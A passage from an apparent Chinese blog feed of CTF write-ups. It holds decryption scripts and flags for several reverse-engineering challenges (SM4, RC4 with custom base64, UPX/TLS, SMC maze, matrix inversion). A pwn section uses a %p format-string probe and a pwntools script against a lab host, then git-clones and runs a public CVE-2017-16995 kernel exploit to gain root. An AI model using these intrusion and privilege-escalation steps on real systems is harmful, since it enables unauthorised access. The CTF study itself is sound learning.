class="number">3</span>][<span class="number">2</span>:]</div><div class="line">c.append(k)</div><div class="line">i=i+<span class="number">4</span></div><div class="line">c1=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">-1</span>,<span class="number">-1</span>):</div><div class="line">c1.append(c[i])</div><div class="line"><span class="keyword">return</span> c1</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_re</span><span class="params">(data,num)</span>:</span></div><div class="line">k=ini_juz(num)</div><div class="line">k1=int(data[<span class="number">0</span>],<span class="number">16</span>)^int(data[<span class="number">1</span>],<span class="number">16</span>)^int(data[<span class="number">2</span>],<span class="number">16</span>)^int(k,<span class="number">16</span>)</div><div class="line">k=hex(k1)</div><div class="line"><span class="keyword">if</span> len(k)==<span class="number">9</span>:</div><div class="line">k=<span class="string">'0x0'</span>+k[<span class="number">2</span>:]</div><div class="line"><span class="keyword">if</span> len(k)==<span class="number">8</span>:</div><div class="line">k=<span class="string">'0x00'</span>+k[<span class="number">2</span>:]</div><div class="line">c=[]</div><div class="line">c.append(k[<span class="number">2</span>:<span class="number">4</span>])</div><div class="line">c.append(k[<span class="number">4</span>:<span class="number">6</span>])</div><div class="line">c.append(k[<span class="number">6</span>:<span class="number">8</span>])</div><div class="line">c.append(k[<span class="number">8</span>:<span class="number">10</span>])</div><div class="line">c1=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">c1.append(hex(key_juz(int(c[i],<span class="number">16</span>))))</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line"><span class="keyword">if</span> len(c1[i])==<span class="number">3</span>:</div><div class="line">k1=<span class="string">'0x0'</span>+c1[i][<span class="number">2</span>:]</div><div class="line">c1[i]=k1</div><div class="line">k=c1[<span class="number">0</span>][<span class="number">2</span>:]+c1[<span class="number">1</span>][<span class="number">2</span>:]+c1[<span class="number">2</span>][<span class="number">2</span>:]+c1[<span class="number">3</span>][<span class="number">2</span>:]</div><div class="line">k1=int(k,<span class="number">16</span>)^xolr(int(k,<span class="number">16</span>),<span class="number">-0xe</span>)^xolr(int(k,<span class="number">16</span>),<span class="number">-0x8</span>)^xolr(int(k,<span class="number">16</span>),<span class="number">0xa</span>)^xolr(int(k,<span class="number">16</span>),<span class="number">0x2</span>)^int(data[<span class="number">3</span>],<span class="number">16</span>)</div><div class="line">bf=hex(k1)</div><div class="line"><span class="keyword">if</span> len(bf)!=<span class="number">10</span>:</div><div class="line">bf=<span class="string">'0x0'</span>+bf[<span class="number">2</span>:]</div><div class="line"><span class="keyword">return</span> bf[<span class="number">2</span>:]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov_re</span><span class="params">(data,bf)</span>:</span></div><div class="line">data[<span class="number">3</span>]=data[<span class="number">2</span>]</div><div class="line">data[<span class="number">2</span>]=data[<span class="number">1</span>]</div><div class="line">data[<span class="number">1</span>]=data[<span class="number">0</span>]</div><div class="line">data[<span class="number">0</span>]=bf</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov</span><span class="params">(data,bf)</span>:</span></div><div class="line">data[<span class="number">0</span>]=data[<span class="number">1</span>]</div><div class="line">data[<span class="number">1</span>]=data[<span class="number">2</span>]</div><div class="line">data[<span class="number">2</span>]=data[<span class="number">3</span>]</div><div class="line">data[<span class="number">3</span>]=bf</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_ch</span><span class="params">(enc)</span>:</span></div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">s=s+enc[i]</div><div class="line">data=bytearray.fromhex(s)</div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</div><div class="line">s=s+chr(data[i])</div><div class="line"><span class="keyword">return</span> s</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">enc=enc_re1()</div><div class="line">enc1=[]</div><div class="line">enc2=[]</div><div class="line">enc3=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</div><div class="line"><span class="keyword">if</span> len(enc[i])!=<span class="number">4</span>:</div><div class="line">k=<span class="string">'0x0'</span>+enc[i][<span class="number">2</span>:]</div><div class="line">enc1.append(k)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">enc1.append(enc[i])</div><div class="line"></div><div class="line"><span class="keyword">if</span> len(enc[<span class="number">16</span>+i])!=<span class="number">4</span>:</div><div class="line">k=<span class="string">'0x0'</span>+enc[<span class="number">16</span>+i][<span class="number">2</span>:]</div><div class="line">enc2.append(k)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">enc2.append(enc[<span class="number">16</span>+i])</div><div class="line"></div><div class="line"><span class="keyword">if</span> len(enc[<span class="number">32</span>+i])!=<span class="number">4</span>:</div><div class="line">k=<span class="string">'0x0'</span>+enc[<span class="number">32</span>+i][<span class="number">2</span>:]</div><div class="line">enc3.append(k)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">enc3.append(enc[<span class="number">32</span>+i])</div><div class="line"></div><div class="line">data=to_4(enc1) <span class="comment">#换成enc2 enc3 即可</span></div><div class="line">num=<span class="number">124</span></div><div class="line">bf=decode_re(data,num)</div><div class="line">mov_re(data,bf)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>):</div><div class="line">num=num<span class="number">-4</span></div><div class="line">bf=decode_re(data,num)</div><div class="line">mov_re(data,bf)</div><div class="line">print(data)</div><div class="line">s=to_ch(data)</div><div class="line">print(s)</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure><p>后来发现是国密4加密算法，想想自己对算法了解太少了，应该多多学习，不过也真正的逆了一次国密算法。今天又尝试下载python3.6(感觉还是习惯了2.7),不过3.6肯定有很大的有点，多多适应吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做了一天的Re题目&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>全球某工商第二届writeup</title>
    <link href="http://yoursite.com/2018/05/07/wp_2018_5_7_zjgsctf/"/>
    <id>http://yoursite.com/2018/05/07/wp_2018_5_7_zjgsctf/</id>
    <published>2018-05-07T01:48:34.000Z</published>
    <updated>2018-05-15T00:35:54.630Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛，自己出题自己做的。<br><a id="more"></a></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="签到题-有名为送分题"><a href="#签到题-有名为送分题" class="headerlink" title="签到题(有名为送分题)"></a>签到题(有名为送分题)</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>拿到题目，发现是文本，直接打开，发现加密函数被写成汇编啦，读汇编就可以知道逻辑结构。即知道是将每一个与或0x30后加1，写出加密算法即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">enc=<span class="string">"\x55\x5b\x50\x56\x4a\x66\x54\x5b\x52\x5e\x5c\x54\x6e\x43\x1f\x6e\x41\x54\x6e\x43\x57\x58\x42\x6e\x58\x42\x6e\x5e\x5d\x5b\x48\x6e\x50\x42\x5c\x4c"</span></div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</div><div class="line">s += chr((ord(enc[i])^<span class="number">0x30</span>)+<span class="number">1</span>)</div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure></p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>flag{Welcome_t0_re_this_is_only_asm}</p><h3 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h3><p>现实工作中，汇编还是需要熟练的，这道题主要是为了考察看汇编的能力。</p><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>拿到题目，先查壳，发现没有壳，直接运行，输入flag返回是否正确，先拖入ida里。找到主函数f5发现不能反汇编成伪代码，发现栈不平衡，无法解析，这里可以patch，参考:<a href="https://esebanana.github.io/2018/03/26/re_ida/" target="_blank" rel="external">https://esebanana.github.io/2018/03/26/re_ida/</a><br><img src="https://i.imgur.com/MOVjxQj.png" alt=""><br>发现是input先base64加密，在进行rc4加密，最后进行硬编码比较,写出解密代码(我是在kali里运行的，外面的环境不好配置):<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf8</span></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</div><div class="line"><span class="keyword">import</span>  base64</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">print</span> <span class="string">'ARC4------------------------------------'</span></div><div class="line">key=<span class="string">'flag&#123;this_is_not_the_flag_hahaha&#125;'</span></div><div class="line">enc=<span class="string">"\x20\xc3\x1a\xae\x97\x3c\x7a\x41\xde\xf6\x78\x15\xcb\x4b\x4c\xdc\x26\x55\x8b\x55\xe5\xe9\x55\x75\x40\x3d\x82\x13\xa5\x60\x13\x3b\xf5\xd8\x19\x0e\x47\xcf\x5f\x5e\xde\x9d\x14\xbd"</span></div><div class="line">ob2=ARC4.new(key)</div><div class="line">enc1=ob2.decrypt(enc)</div><div class="line"><span class="keyword">print</span> enc1</div><div class="line"><span class="keyword">print</span> base64.b64decode(enc1)</div></pre></td></tr></table></figure></p><p>发现bese64解出来是乱码，回去看ck1，是base64没有错啊，？？？。最后发送是base64的表被改变啦，再次写出解密代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf8</span></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</div><div class="line"><span class="keyword">import</span>  base64</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">print</span> <span class="string">'ARC4------------------------------------'</span></div><div class="line">key=<span class="string">'flag&#123;this_is_not_the_flag_hahaha&#125;'</span></div><div class="line">enc=<span class="string">"\x20\xc3\x1a\xae\x97\x3c\x7a\x41\xde\xf6\x78\x15\xcb\x4b\x4c\xdc\x26\x55\x8b\x55\xe5\xe9\x55\x75\x40\x3d\x82\x13\xa5\x60\x13\x3b\xf5\xd8\x19\x0e\x47\xcf\x5f\x5e\xde\x9d\x14\xbd"</span></div><div class="line">ob2=ARC4.new(key)</div><div class="line">enc1=ob2.decrypt(enc)</div><div class="line"><span class="keyword">print</span> enc1</div><div class="line"><span class="keyword">print</span> <span class="string">'base64--------------------------------------'</span></div><div class="line">s=<span class="string">''</span></div><div class="line">Base64=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></div><div class="line">table=    <span class="string">"ABCDEFGHIJSTUVWKLMNOPQRXYZabcdqrstuvwxefghijklmnopyz0123456789+/"</span></div><div class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> enc1:</div><div class="line"><span class="keyword">if</span> ch <span class="keyword">in</span> Base64:</div><div class="line">s  = s + Base64[string.find(table,str(ch))]</div><div class="line"><span class="keyword">elif</span> ch == <span class="string">'='</span>:</div><div class="line">s = s + <span class="string">'='</span> </div><div class="line"><span class="keyword">print</span> base64.b64decode(s)</div></pre></td></tr></table></figure></p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p>flag{y0u_know_rc4_and_base64_ha$}</p><h3 id="出题思路-1"><a href="#出题思路-1" class="headerlink" title="出题思路"></a>出题思路</h3><p>这道题主要考察选手对常见加密算法的base64和rc4的熟悉程度，故意把函数的栈破坏，导致ida识别失败，同时也考察能对ida的异常进行处理。</p><h2 id="New-driver"><a href="#New-driver" class="headerlink" title="New driver"></a>New driver</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>拿到题目，先查壳，发现有upx壳，这个壳很简单，可以手脱，不过发现用od打开的时候，一运行就退出啦，脱进ida里，发现有tls<br>1、去掉节区里的tls,参考<a href="https://esebanana.github.io/2017/10/10/re_tls/" target="_blank" rel="external">https://esebanana.github.io/2017/10/10/re_tls/</a><br>2、脱下upx壳，<a href="https://esebanana.github.io/2018/03/15/re_tou_ke/" target="_blank" rel="external">https://esebanana.github.io/2018/03/15/re_tou_ke/</a><br>3、可以进行分析啦<br>发现主函数<br><img src="https://i.imgur.com/6NuWpL4.png" alt=""><br>发现有两个线程函数，one和two，后面是一个与enc_flag比较，那主要看看one,two都做了什么加密。<br>分析one:<br><img src="https://i.imgur.com/50TDEcw.png" alt=""><br>一个sleep函数(可能是线程one与线程two替换加密)，还有一个加密函数，进去发现不能f5,这里也patch这个ck1(与babyre方法一样)，最后进行lenn–;<br><img src="https://i.imgur.com/dVZm0R5.png" alt=""><br>发现必须是大写或小写，否者就退出，如果是小写，则将enc=table[enc-38];若为大写，则enc=table[enc-96]<br>分析two：<br>发现只是lenn–<br>那么输入时偶数时不变，奇数是进行加密，写出解密函数:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">table=<span class="string">"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"</span></div><div class="line">enc=<span class="string">"\x54\x4f\x69\x5a\x69\x5a\x74\x4f\x72\x59\x61\x54\x6f\x55\x77\x50\x6e\x54\x6f\x42\x73\x4f\x61\x4f\x61\x70\x73\x79\x53\x79"</span></div><div class="line">lenn=len(enc)</div><div class="line"><span class="keyword">print</span> lenn</div><div class="line">s=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(lenn):</div><div class="line"><span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</div><div class="line">s.append(enc[i])</div><div class="line"><span class="keyword">else</span>:</div><div class="line">k = table.index(enc[i])</div><div class="line"><span class="keyword">if</span> k&gt;<span class="number">26</span>:</div><div class="line">s.append(chr(k + <span class="number">38</span>))</div><div class="line"><span class="keyword">else</span>:</div><div class="line">s.append( chr(k + <span class="number">96</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">''</span>.join(s)</div></pre></td></tr></table></figure></p><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p>flag{ThisisthreadofwindowshahaIsESE}</p><h3 id="出题思路-2"><a href="#出题思路-2" class="headerlink" title="出题思路"></a>出题思路</h3><p>主要考察简单脱壳，已及PE的文件结构tls,最后考察了对线程的理解和一个简单的加密函数，</p><h2 id="Old-driver"><a href="#Old-driver" class="headerlink" title="Old driver"></a>Old driver</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>拿到题目，先查壳，没有壳，用ida打开<br><img src="https://i.imgur.com/V3cXdD5.png" alt=""><br>发现一个函数地址被与或啦，这里想到smc，可以参考<br><a href="https://esebanana.github.io/2017/10/10/re_tls/" target="_blank" rel="external">https://esebanana.github.io/2017/10/10/re_tls/</a><br>用od打开，运行<br><img src="https://i.imgur.com/UOPUdx9.png" alt=""><br>在这里dump出程序出来，再次ida打开<br><img src="https://i.imgur.com/so6S0G0.png" alt=""><br>前5个必须是flag{,最后必须是}<br>进入ck1，首先发现有验证5-11位的，<br><img src="https://i.imgur.com/QUw4XAh.png" alt=""><br>这里v3不知道，不过我们可以从od里知道v3的数据。接着又是将12-17位进行base64加密在进行比较，接着进入下一个函数<br><img src="https://i.imgur.com/LzGvAH9.png" alt=""><br>这里可以发现是一个迷宫，是用来验证18-39位的，画出迷宫，走出迷宫便可以啦。<br>解密函数如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="comment">#----------------------------</span></div><div class="line">enc1=<span class="string">'flag&#123;'</span></div><div class="line"><span class="comment">#----------------------------</span></div><div class="line">enc2=<span class="string">'\xf2\xee\xef\xf5\xd9\xef'</span></div><div class="line">s=[]</div><div class="line">s.append(enc1)</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> enc2:</div><div class="line">    s.append(chr(ord(x)^<span class="number">0x86</span>))</div><div class="line"><span class="comment">#----------------------------</span></div><div class="line">enc3=<span class="string">'\x63\x31\x39\x7a\x62\x57\x4e\x66'</span></div><div class="line">data=base64.b64decode(enc3)</div><div class="line">s.append(data)</div><div class="line"><span class="comment">#-----------------------------</span></div><div class="line">s.append(<span class="string">'waaaaawwwww22222qqqaaw&#125;'</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">''</span>.join(s)</div></pre></td></tr></table></figure></p><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p>flag{this_is_smc_waaaaawwwww22222qqqaaw}</p><h3 id="出题思路-3"><a href="#出题思路-3" class="headerlink" title="出题思路"></a>出题思路</h3><p>这里考察了4层smc，因为smc在恶意软件中经常使用，防免杀。又考察啦od的patch能力，已经base64,走迷宫等</p><h2 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>拿到题目，发现是elf的，先放进ida里面，代码很简单<br><img src="https://i.imgur.com/W8NkO10.png" alt=""><br>先判断输入的是否是64位，然后fork()一个子进程，然后子进程与父进程进行通信，<br>先看看父进程的加密:<br><img src="https://i.imgur.com/RWGrXuM.png" alt=""><br>发现是一个rot13<br>再来看看子进程<br>发现将父进程加密后的数据读出来，在进行矩阵乘法，最后进行比较，写出解密代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *;</div><div class="line">mat1=[</div><div class="line">[ <span class="number">0x2B</span>, <span class="number">0x16</span>, <span class="number">0x1E</span>, <span class="number">0x53</span>, <span class="number">0x35</span>, <span class="number">0x39</span>, <span class="number">0x20</span>, <span class="number">0x29</span> ],</div><div class="line">[ <span class="number">0x35</span>, <span class="number">0x63</span>, <span class="number">0x0A</span>, <span class="number">0x28</span>, <span class="number">0x2C</span>, <span class="number">0x06</span>, <span class="number">0x32</span>, <span class="number">0x2A</span> ],</div><div class="line">[ <span class="number">0x55</span>, <span class="number">0x39</span>, <span class="number">0x14</span>, <span class="number">0x5F</span>, <span class="number">0x20</span>, <span class="number">0x19</span>, <span class="number">0x34</span>, <span class="number">0x21</span> ],</div><div class="line">[ <span class="number">0x19</span>, <span class="number">0x0B</span>, <span class="number">0x5A</span>, <span class="number">0x09</span>, <span class="number">0x50</span>, <span class="number">0x34</span>, <span class="number">0x6F</span>, <span class="number">0x5C</span> ],</div><div class="line">[ <span class="number">0x16</span>, <span class="number">0x1A</span>, <span class="number">0x68</span>, <span class="number">0x63</span>, <span class="number">0x34</span>, <span class="number">0x4E</span>, <span class="number">0x16</span>, <span class="number">0x45</span> ],</div><div class="line">[ <span class="number">0x4C</span>, <span class="number">0x53</span>, <span class="number">0x2F</span>, <span class="number">0x3F</span>, <span class="number">0x3F</span>, <span class="number">0x28</span>, <span class="number">0x69</span>, <span class="number">0x51</span> ],</div><div class="line">[ <span class="number">0x39</span>, <span class="number">0x44</span>, <span class="number">0x12</span>, <span class="number">0x24</span>, <span class="number">0x0A</span>, <span class="number">0x4D</span>, <span class="number">0x55</span>, <span class="number">0x31</span> ],</div><div class="line">[ <span class="number">0x49</span>, <span class="number">0x3B</span>, <span class="number">0x40</span>, <span class="number">0x3B</span>, <span class="number">0x43</span>, <span class="number">0x28</span>, <span class="number">0x21</span>, <span class="number">0x36</span> ]</div><div class="line">]</div><div class="line">enc=[</div><div class="line">[<span class="number">39430</span>, <span class="number">34714</span>, <span class="number">32196</span>, <span class="number">36639</span>, <span class="number">34988</span>, <span class="number">34059</span>, <span class="number">30813</span>, <span class="number">33326</span>], </div><div class="line">[<span class="number">36796</span>, <span class="number">32617</span>, <span class="number">33253</span>, <span class="number">34580</span>, <span class="number">34162</span>, <span class="number">34694</span>, <span class="number">27284</span>, <span class="number">30462</span>], </div><div class="line">[<span class="number">43121</span>, <span class="number">39454</span>, <span class="number">38526</span>, <span class="number">40343</span>, <span class="number">40267</span>, <span class="number">39622</span>, <span class="number">32312</span>, <span class="number">35938</span>], </div><div class="line">[<span class="number">52554</span>, <span class="number">37142</span>, <span class="number">43063</span>, <span class="number">43360</span>, <span class="number">41895</span>, <span class="number">39806</span>, <span class="number">44188</span>, <span class="number">43934</span>], </div><div class="line">[<span class="number">51532</span>, <span class="number">44412</span>, <span class="number">41672</span>, <span class="number">48518</span>, <span class="number">45549</span>, <span class="number">44436</span>, <span class="number">41365</span>, <span class="number">45032</span>], </div><div class="line">[<span class="number">60785</span>, <span class="number">49721</span>, <span class="number">52606</span>, <span class="number">54361</span>, <span class="number">52991</span>, <span class="number">52156</span>, <span class="number">47474</span>, <span class="number">50031</span>], </div><div class="line">[<span class="number">43050</span>, <span class="number">35311</span>, <span class="number">36031</span>, <span class="number">39633</span>, <span class="number">34447</span>, <span class="number">34470</span>, <span class="number">31270</span>, <span class="number">31954</span>],</div><div class="line">[<span class="number">49152</span>, <span class="number">43386</span>, <span class="number">42096</span>, <span class="number">46024</span>, <span class="number">45029</span>, <span class="number">43961</span>, <span class="number">36733</span>, <span class="number">42762</span>]</div><div class="line">]</div><div class="line"><span class="comment">#矩阵的逆</span></div><div class="line"><span class="comment">#B*A=C</span></div><div class="line"><span class="comment">#B=A1*C</span></div><div class="line">A=mat(mat1)</div><div class="line"><span class="comment">#A的逆矩阵</span></div><div class="line">A1=linalg.inv(A)</div><div class="line">C=mat(enc)</div><div class="line">B1=A1*C</div><div class="line"></div><div class="line">c=B1.tolist()</div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">k=c[j]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">kk=int(k[i])+<span class="number">0.5</span></div><div class="line"><span class="keyword">if</span> k[i]&gt;kk:</div><div class="line">s=s+chr(int(k[i])+<span class="number">1</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">s=s+chr(int(k[i]))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span><span class="params">(s)</span>:</span></div><div class="line">flag=<span class="string">''</span></div><div class="line">le=len(s)</div><div class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> s:</div><div class="line">tmp=ord(ch)+<span class="number">13</span></div><div class="line"><span class="keyword">if</span> ch.isupper():</div><div class="line"><span class="keyword">if</span> tmp&gt;<span class="number">90</span>:</div><div class="line">tmp=tmp<span class="number">-26</span></div><div class="line"><span class="keyword">elif</span> ch.islower():</div><div class="line"><span class="keyword">if</span> tmp&gt;<span class="number">122</span>:</div><div class="line">tmp=tmp<span class="number">-26</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">tmp=ord(ch)</div><div class="line">flag +=chr(tmp)</div><div class="line"><span class="keyword">return</span> flag</div><div class="line"></div><div class="line">s=rot13(s)</div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure></p><h3 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h3><p>flag{y0u_are_g0Od_for_Math_this_is_Matrix_5f0256b0f586a7b55dasd}</p><h3 id="出题思路-4"><a href="#出题思路-4" class="headerlink" title="出题思路"></a>出题思路</h3><p>主要考察进程间的通讯，rot13,和矩阵乘法的运用。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>这里有全部题目的源代码，解密代码和程序<br>链接：<a href="https://pan.baidu.com/s/1qEr6y0JdqEVI-B9CoIBvqQ" target="_blank" rel="external">https://pan.baidu.com/s/1qEr6y0JdqEVI-B9CoIBvqQ</a> 密码：uziu</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>这是队友出的题目，自己也去做了做，也发现很有意思</p><h2 id="得到shell"><a href="#得到shell" class="headerlink" title="得到shell"></a>得到shell</h2><h3 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h3><p>在用户名输入%p%p%p%p%p%p%p%p，发现第一个字符串有特别，用%s输出，发现Bob,密码:随便猜测，发现是123456（当时我随便输了123，就没有猜测啦,用的是第二种方法）</p><h3 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h3><p>exp<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#coding=utf8</span></div><div class="line">from pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">r = remote(<span class="string">"10.21.13.202"</span>,<span class="number">1234</span>)</div><div class="line">r.recvuntil(<span class="string">"请输入要进行的操作："</span>)</div><div class="line">r.sendline(<span class="string">"2"</span>)</div><div class="line">r.recvuntil(<span class="string">"第一步，请做100次基本的数学运算吧："</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i in range(<span class="number">100</span>):</div><div class="line">r.recvuntil(<span class="string">":"</span>)</div><div class="line">data=r.recvuntil(<span class="string">"="</span>)</div><div class="line">k1=<span class="keyword">int</span>(data.split(<span class="string">' '</span>)[<span class="number">1</span>],<span class="number">10</span>)</div><div class="line">f=data.split(<span class="string">' '</span>)[<span class="number">2</span>]</div><div class="line">k2=<span class="keyword">int</span>(data.split(<span class="string">' '</span>)[<span class="number">3</span>],<span class="number">10</span>)</div><div class="line"><span class="keyword">if</span> f==<span class="string">'+'</span>:</div><div class="line">   key=k1+k2</div><div class="line">elif f==<span class="string">'-'</span>:</div><div class="line">   key=k1-k2</div><div class="line">elif f==<span class="string">'*'</span>:</div><div class="line">   key=k1*k2</div><div class="line">elif f==<span class="string">'/'</span>:</div><div class="line">   key=k1/k2</div><div class="line">r.sendline(str(key))</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p><p>得到加密后在字符串，题目是区块链+各种解码猜测后发现是base58，解码出来得到用户名和密码</p><h2 id="寻找flag"><a href="#寻找flag" class="headerlink" title="寻找flag"></a>寻找flag</h2><p>用命令<br><code>find -name flag</code><br>发现找不到，经过出题人提示，flag在root目录下，但是这个用户无法进入，当然想到提权啦。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>uname -a</code><br>发现linux内核版本，然后百度一下，发现CVE-2017-16995漏洞类似，去github上找一下，找到利用脚本，然后下载下来<br><code>git clone https://github.com/iBearcat/CVE-2017-16995.git</code><br>这里我不知道下载下来没有，ls一下，发现一家下载下来啦,运行<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td 